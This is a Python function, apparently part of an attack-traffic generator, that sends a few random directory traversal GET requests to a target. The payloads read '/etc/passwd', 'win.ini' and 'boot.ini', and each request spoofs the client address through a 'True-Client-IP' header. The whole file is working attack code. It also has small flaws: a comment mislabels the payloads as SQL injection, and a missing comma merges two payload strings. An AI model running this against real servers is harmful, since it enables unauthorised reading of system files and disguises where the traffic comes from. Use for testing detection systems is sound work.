import random
import requests

# basic directory traversal attempts (GETs)
def directory_traversal(target, source_ip, user_agent, **kwargs):

    #common paths + params
    paths =   [
                "index.php?id=",
                "index.php?s=",
                "?query=",
                "debug.php?&log="
              ]
    #generic sqli
    attacks = [
                "../../etc/passwd",
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../win.ini",
                "../../../win.ini"
                "../../../boot.ini"
              ]


    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip),
               'Content-Type': 'application/x-www-form-urlencoded'
              }

    count=random.randint(1,5)
    ret=""

    for i in range(count):

        # pick a random path and attack to try
        attack = random.choice(attacks)
        path = random.choice(paths)

        req = {
                   "method": "GET",
                   "url": "{}/{}{}".format(target,path,attack)
                 }
        response = requests.request(req['method'], req['url'], headers=headers).status_code
        ret += "dir_traversal: got {} with {}\n".format(response,req['url'])


    return(ret)
